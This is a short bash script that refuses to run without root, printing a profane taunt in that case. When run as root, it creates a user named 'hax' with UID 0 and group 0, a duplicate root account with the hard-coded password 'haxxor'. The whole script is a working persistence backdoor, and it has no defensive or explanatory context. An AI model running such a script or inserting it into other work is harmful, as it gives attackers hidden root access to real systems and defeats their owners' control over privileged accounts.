#!/bin/bash

if [ "$(id -u)" != "0" ]; then
	echo "Buy some sudo you fucking scrub" 1>&2
	exit 1
fi

useradd -ou 0 -g 0 hax -p $(openssl passwd -1 haxxor)
